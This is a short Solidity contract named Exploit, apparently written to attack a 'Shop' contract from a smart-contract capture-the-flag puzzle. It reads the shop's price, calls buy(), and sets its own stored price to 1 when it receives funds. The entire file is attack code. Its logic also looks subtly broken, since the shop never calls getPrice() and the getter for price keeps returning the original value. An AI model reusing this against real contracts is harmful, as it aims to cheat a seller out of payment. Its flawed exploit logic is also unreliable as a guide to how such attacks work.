// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./Shop.sol";

contract Exploit {
    Shop shop;
    uint256 public price;

    constructor(Shop _shop) {
        shop = _shop;
        price = shop.price();
    }

    function exploit() public {
        shop.buy();
    }

    function getPrice() external view returns (uint256) {
        return price;
    }

    // fallback function to receive funds
    receive() external payable {
        price = 1;
    }
}
